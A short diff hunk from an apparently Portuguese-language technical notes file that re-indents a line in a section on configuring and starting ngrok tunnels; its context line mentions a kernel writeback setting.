@@ -5505,6 +5485,7 @@ NOTA: Comando para uma shell interativa: echo 0 > /proc/sys/vm/dirty_writeback_c
                       proto: http
                       addr: 80
 
-        Salva e inicia...
+Salva e inicia...
+
         ngrok start --all: Abre as conexões configuradas no arquivo yml
 
